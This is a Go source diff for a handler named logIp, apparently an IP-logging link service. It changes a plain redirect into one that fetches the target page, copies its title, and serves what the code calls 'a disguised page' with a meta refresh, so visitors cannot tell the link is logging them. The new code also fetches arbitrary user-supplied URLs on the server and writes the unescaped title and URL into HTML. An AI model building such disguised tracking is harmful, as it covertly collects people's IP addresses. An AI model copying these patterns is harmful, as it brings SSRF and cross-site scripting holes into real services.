@@ -6,6 +6,9 @@ import (
 	"net/http"
 	"net/url"
 	"os"
+	"golang.org/x/net/html"
+	"io"
+
 
 	"github.com/joho/godotenv"
 )
@@ -15,6 +18,23 @@ func init() {
 	err := godotenv.Load()
 	if err != nil {
 		log.Fatal("Error loading .env file")
+	}
+}
+
+func extractTitle(body io.Reader) (string, error) {
+	z := html.NewTokenizer(body)
+	for {
+		tt := z.Next()
+		switch {
+		case tt == html.ErrorToken:
+			return "", fmt.Errorf("no title found")
+		case tt == html.StartTagToken:
+			t := z.Token()
+			if t.Data == "title" {
+				z.Next()
+				return z.Token().Data, nil
+			}
+		}
 	}
 }
 
@@ -68,7 +88,45 @@ func logIp(w http.ResponseWriter, r *http.Request) {
 		}
 
 		// Redirect the user to the provided URL
-		http.Redirect(w, r, redirectURL, http.StatusFound)
+		if redirectURL != "" {
+			// Validate and parse the URL
+			_, err := url.ParseRequestURI(redirectURL)
+			if err != nil {
+				http.Error(w, "Invalid URL", http.StatusBadRequest)
+				return
+			}
+		
+			// Fetch the destination page
+			resp, err := http.Get(redirectURL)
+			if err != nil || resp.StatusCode != 200 {
+				http.Error(w, "Failed to fetch redirect target", http.StatusInternalServerError)
+				return
+			}
+			defer resp.Body.Close()
+		
+			// Extract the title
+			title, err := extractTitle(resp.Body)
+			if err != nil {
+				title = "Redirecting..."
+			}
+		
+			// Serve a disguised page with the real page's title and meta redirect
+			w.Header().Set("Content-Type", "text/html")
+			fmt.Fprintf(w, `<!DOCTYPE html>
+		<html lang="en">
+		<head>
+			<meta charset="UTF-8">
+			<meta http-equiv="refresh" content="0;url=%s">
+			<title>%s</title>
+		</head>
+		<body>
+			<p>If you are not redirected automatically, <a href="%s">click here</a>.</p>
+		</body>
+		</html>`, redirectURL, title, redirectURL)
+		
+			return
+		}
+		
 		return
 	}
 
